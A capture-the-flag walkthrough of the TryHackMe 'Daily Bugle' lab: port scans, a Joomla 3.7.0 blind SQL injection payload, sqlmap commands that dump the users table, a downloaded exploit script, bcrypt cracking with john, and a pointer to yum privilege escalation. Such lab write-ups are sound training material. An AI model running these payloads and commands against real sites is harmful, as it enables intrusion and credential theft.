| [![Daily Bugle](/_static/images/skynet.png)](https://tryhackme.com/room/dailybugle) |
|:--:|
| [https://tryhackme.com/room/dailybugle](https://tryhackme.com/room/dailybugle) |

# The Daily Bugle

Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage 
of yum.

## Scanning

Run a simple port scan (without Ping)

	# nmap -Pn -p- <IP address target machine> -oN portscan

portscan:

```text
# Nmap 7.92 scan initiated Sat Oct  1 22:50:08 2022 as: nmap -Pn -p- -oN portscan 10.10.38.105
Nmap scan report for 10.10.38.105
Host is up (0.043s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql

# Nmap done at Sat Oct  1 22:51:17 2022 -- 1 IP address (1 host up) scanned in 69.03 seconds
```

Run an `-A` scan on the open ports:

	# nmap -Pn -T4 -A -p22,80,3306 <IP address target machine> -oN servicescan

servicescan:

```text
# Nmap 7.92 scan initiated Sat Oct  1 22:51:25 2022 as: nmap -Pn -T4 -A -p22,80,3306 -oN servicescan 10.10.38.105
Nmap scan report for 10.10.38.105
Host is up (0.039s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-generator: Joomla! - Open Source Content Management
|_http-title: Home
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
3306/tcp open  mysql   MariaDB (unauthorized)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Linux 3.10 (92%), Linux 3.12 (92%), Linux 3.19 (92%), Linux 3.2 - 4.9 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 3306/tcp)
HOP RTT      ADDRESS
1   38.60 ms 10.9.0.1
2   38.79 ms 10.10.38.105

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Oct  1 22:51:44 2022 -- 1 IP address (1 host up) scanned in 19.41 seconds
```

## Exploring

| ![The Bugle](/_static/images/Screenshot from 2022-10-01 22-55-47.png) |
|:--:|
| http://10.10.38.105 |

Get version via the `joomla.xml` file:

| ![Joomla.xml](/_static/images/Screenshot from 2022-10-01 22-56-25.png) |
|:--:|
| http://10.10.38.105/administrator/manifests/files/joomla.xml |

Or get version from README.txt:

    # curl -s http://<IP address target machine>/README.txt | head

Check for Joomla 3.7.0 vulnerabilities:

    # searchsploit joomla 3.7.0                        
    ---------------------------------------------- ---------------------------------
     Exploit Title                                |  Path
    ---------------------------------------------- ---------------------------------
    Joomla! 3.7.0 - 'com_fields' SQL Injection    | php/webapps/42033.txt
    Joomla! Component Easydiscuss < 4.0.21 - Cros | php/webapps/43488.txt
    ---------------------------------------------- ---------------------------------
    Shellcodes: No Results
    Papers: No Results

Mirroring:

    # searchsploit -m php/webapps/42033.txt
      Exploit: Joomla! 3.7.0 - 'com_fields' SQL Injection
          URL: https://www.exploit-db.com/exploits/42033
         Path: /usr/share/exploitdb/exploits/php/webapps/42033.txt
    File Type: ASCII text

Apparently, this version of Joomla is affected by a blind SQL injection in the `list[fullordering]` parameter.

In browser, run the payloaod provided by SQLMap to confirm the endpoint is vulnerable:

| ![Confirmation](/_static/images/Screenshot from 2022-10-01 23-30-47.png) |
|:--:|
| http://10.10.38.105/index.php?option=com_fields&view=fields&layout=<br>modal&list[fullordering]=(SELECT * FROM (SELECT(SLEEP(5)))GDiu) |

## Gaining a foothold

Run SQLMap using the arguments specified in the exploit:

    sqlmap -u "http://<IP address target machine>/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]

Takes ages. The [users table](https://docs.joomla.org/Tables/users) may contain 
credentials to access the Joomla administration section.

Dump the username and password columns from the `users` table:

    sqlmap -u "http://<IP address target machine>/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomla -T "#__users" -C username,password -p list[fullordering] --dump

As an alternative, this python script is specific for Joomla:

    # wget https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/master/joomblah.py
    # python joomblah.py http://<IP address target machine>

Put hash in a file named `hash.txt` and crack the hash:

    # john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
    Using default input encoding: UTF-8
    Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
    Cost 1 (iteration count) is 1024 for all loaded hashes
    Will run 4 OpenMP threads
    Press 'q' or Ctrl-C to abort, almost any other key for status
    0g 0:00:00:19 0.01% (ETA: 2022-10-04 09:12) 0g/s 83.11p/s 83.11c/s 83.11C/s rock you..gymnastics
    0g 0:00:00:21 0.01% (ETA: 2022-10-04 11:22) 0g/s 81.01p/s 81.01c/s 81.01C/s 2hot4u..sexylove
    spiderman123     (?)     
    1g 0:00:10:44 DONE (2022-10-02 00:27) 0.001551g/s 72.65p/s 72.65c/s 72.65C/s thelma1..speciala
    Use the "--show" option to display all of the cracked passwords reliably
    Session completed.

## Privilege escalation

Log in with the found username and password.

Yum is a free and open-source command-line package-management utility for Linux-based operating system which uses the RPM Package Manager.

According to [GTFOBins yum](https://gtfobins.github.io/gtfobins/yum/), yum can be used to escalate privileges by 
crafting an RPM package and installing it on the victim machine. Follow the steps given.